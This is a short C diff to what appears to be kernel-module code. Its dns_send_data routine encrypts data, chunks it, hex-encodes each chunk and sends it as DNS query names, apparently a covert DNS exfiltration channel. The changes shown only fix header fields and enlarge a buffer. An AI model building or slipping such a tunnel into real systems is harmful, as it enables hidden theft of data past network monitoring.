@@ -48,9 +48,11 @@ static int dns_send_query(const char *query_name, __be16 question_type, u8 *resp
     // Build the DNS header
     struct dns_header_t *hdr = (void *)packet_buffer;
     get_random_bytes(&hdr->id, sizeof(hdr->id));
-    hdr->flags = htons(0x0100); // RD = 1 (recursion desired)
-    hdr->qdcount = htons(1);    // One question
-    hdr->arcount = 0;    // One OPT record for EDNS0
+    hdr->flags = htons(0x0100);
+    hdr->qdcount = htons(1);
+    hdr->ancount = htons(0);
+    hdr->nscount = htons(0);
+    hdr->arcount = htons(0);
     offset = DNS_HDR_SIZE;
 
     // Encode QNAME: split labels by '.' and prefix length
@@ -174,7 +176,7 @@ int dns_send_data(const char *data, size_t data_len) {
         size_t chunk_size = min(encrypted_len - chunk_index * DNS_MAX_CHUNK, (size_t)DNS_MAX_CHUNK);
         char hex_buffer[2 * DNS_MAX_CHUNK + 1];
         char seq_label[80];
-        char full_qname[128];
+        char full_qname[200];
         size_t i;
 
         // Hex-encode the chunk
